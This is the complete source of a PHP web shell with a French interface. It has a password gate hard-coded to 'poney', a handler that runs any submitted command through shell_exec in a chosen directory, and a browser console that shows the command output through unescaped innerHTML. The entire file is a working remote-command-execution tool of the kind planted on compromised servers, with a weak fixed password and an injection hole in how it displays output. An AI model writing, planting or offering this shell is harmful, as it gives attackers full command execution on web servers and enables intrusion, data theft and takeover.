<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_GET['ajax'])) {
    // AJAX mode
    header('Content-Type: application/json');

    $PASSWORD = 'poney';
    $data = json_decode(file_get_contents('php://input'), true);

    if (!isset($data['auth']) || $data['auth'] !== $PASSWORD) {
        echo json_encode(['error' => 'Mot de passe invalide.']);
        exit;
    }

    $cwd = isset($data['cwd']) && is_dir($data['cwd']) ? $data['cwd'] : getcwd();
    $cmd = isset($data['cmd']) ? trim($data['cmd']) : '';
    $output = '';

    if (preg_match('/^\s*cd\s+(.+)/', $cmd, $m)) {
        $target = trim($m[1]);
        $new_path = realpath($cwd . DIRECTORY_SEPARATOR . $target);
        if ($new_path && is_dir($new_path)) {
            $cwd = $new_path;
        }
        $output = '';
    } elseif (!empty($cmd)) {
        $full_cmd = "cd " . escapeshellarg($cwd) . " && " . $cmd;
        $output = shell_exec($full_cmd . ' 2>&1');
    }

    echo json_encode([
        'cmd' => $cmd,
        'output' => trim($output),
        'cwd' => $cwd
    ]);
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>🐚 Web Shell</title>
    <style>
        body { background:#1e1e1e; color:#d0d0d0; font-family:monospace; padding:20px; }
        input[type=text], input[type=password] {
            width:70%; padding:6px; background:#333; color:#0f0;
            border:1px solid #555; font-size:16px;
        }
        button {
            padding:6px 12px; background:#444; color:#fff;
            border:1px solid #777; cursor:pointer;
        }
        .block {
            background:#2a2a2a; margin-top:10px; padding:10px;
            border-left:4px solid #0af;
        }
        .cwd { color:#0af; font-weight:bold; }
        .cmd { color:#fff000; }
        .out { color:#0f0; white-space:pre-wrap; margin-top:5px; }
    </style>
</head>
<body>
    <h2>💻 Web Shell</h2>

    <div id="auth">
        <form onsubmit="login(); return false;">
            <input type="password" id="pw" placeholder="Mot de passe">
            <button>Valider</button>
        </form>
    </div>

    <div id="shell" style="display:none;">
        <div>Répertoire : <span class="cwd" id="cwd"></span></div>
        <form onsubmit="sendCommand(); return false;">
            <input type="text" id="cmd" autocomplete="off" autofocus>
            <button>Exécuter</button>
        </form>
        <div id="results"></div>
    </div>

    <script>
        let cwd = "";
        let password = "";
        let history = [];

        function login() {
            password = document.getElementById("pw").value;
            fetch('?ajax=1', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ auth: password, cmd: 'pwd', cwd: '' })
            })
            .then(res => res.json())
            .then(data => {
                if (data.error) {
                    alert(data.error);
                } else {
                    cwd = data.cwd;
                    document.getElementById("cwd").textContent = cwd;
                    document.getElementById("auth").style.display = "none";
                    document.getElementById("shell").style.display = "block";
                }
            });
        }

        function sendCommand() {
            const cmd = document.getElementById("cmd").value;
            if (!cmd) return;
            fetch('?ajax=1', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ auth: password, cmd, cwd })
            })
            .then(res => res.json())
            .then(data => {
                if (data.error) {
                    alert(data.error);
                    return;
                }
                cwd = data.cwd;
                document.getElementById("cwd").textContent = cwd;

                history.push(data);
                if (history.length > 5) history.shift();

                renderResults();
                document.getElementById("cmd").value = '';
            });
        }

        function renderResults() {
            const container = document.getElementById("results");
            container.innerHTML = '';
            for (let i = history.length - 1; i >= 0; i--) {
                const item = history[i];
                const block = document.createElement("div");
                block.className = "block";
                block.innerHTML = `
                    <div class='cwd'>${item.cwd}</div>
                    <div class='cmd'>$ ${item.cmd}</div>
                    <div class='out'>${item.output || '(aucun résultat)'}</div>
                `;
                container.appendChild(block);
            }
        }

    </script>
</body>
</html>
